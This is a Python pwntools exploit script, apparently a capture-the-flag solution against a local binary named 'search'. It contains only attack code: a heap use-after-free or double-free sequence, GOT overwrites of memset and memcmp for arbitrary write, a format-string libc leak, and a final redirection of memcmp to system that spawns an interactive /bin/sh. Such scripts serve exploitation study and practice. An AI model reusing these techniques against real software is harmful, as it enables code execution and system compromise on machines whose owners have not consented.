#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

def index(size, sentence):
    p.sendlineafter(b'Quit', '2')
    p.sendlineafter(b'size:', str(size))
    p.sendafter(b'sentence:', sentence)
    log.info('send sentence: {}'.format(sentence))
    
def search(size, word):
    p.sendlineafter(b'Quit', '1')
    p.sendlineafter(b'size:', str(size))
    p.sendafter(b'word:', word)
    log.info('send word: {}'.format(word))

def delete(option):
    p.sendlineafter(b'(y/n)?', option)
    log.info('delete: {}'.format(option))

elf = ELF('./search-bf61fbb8fa7212c814b2607a81a84adf')
libc = ELF('./libc-2.27.so')
p = process('./search-bf61fbb8fa7212c814b2607a81a84adf')

size = 0x60
w1 = b'A' * (size - 2) 
wI = b'I'
sI = w1 + b' ' + wI
index(size, sI)
search(1, wI)
delete('y')

search(size - 2, w1)
delete('y')

addr = p64(elf.got['memset'])
payload = addr.ljust(size, b'A')
index(size, payload)

s = b'A' * size
index(size, s)

# Arbitrary write
payload = flat(
        elf.plt['__printf_chk'], 0,
        elf.plt['__printf_chk'], 0,
        elf.plt['strtol']+6, elf.plt['malloc']+6,
        elf.plt['__printf_chk']+6, 0,
        elf.plt['exit']+6, elf.plt['fwrite']+6,
        0, 0)
index(size, payload)

# Leak libc
fmt = '%p %p %p %p %p|%p|'
index(len(fmt), b'A' * len(fmt))
search(len(fmt), fmt)
offset = 0x80b62
p.recvuntil(b'|')
libc.address = int(p.recvuntil(b'|', drop=True), 16) - offset
log.info('libc.address = {:#x}'.format(libc.address))

size = 0x10
l1 = 3
s3 = b'A' * (size - l1 - 1) + b' ' + b'I' * l1
index(size, s3)

l2 = 4
s4 = b'A' * (size - l2 - 1) + b' ' + b'I' * l2
index(size, s4)
search(l1, b'\0'*l1)
delete('y')
search(l2, b'\0'*l2)
delete('y')
search(l2, b'\0'*l2)
delete('y')

index(size, b'A' * size)

addr = p64(elf.got['memcmp'])
payload = addr.ljust(size, b'A')
index(size, payload)

index(size, b'A' * size)

# Arbitrary write
payload = flat(libc.symbols['system'], 0)
index(size, payload)

size = 0x20
index(size, b'/bin/sh'.ljust(size, b'\0'))

search(size, b'yeah'.ljust(size, b'\0'))

p.interactive()

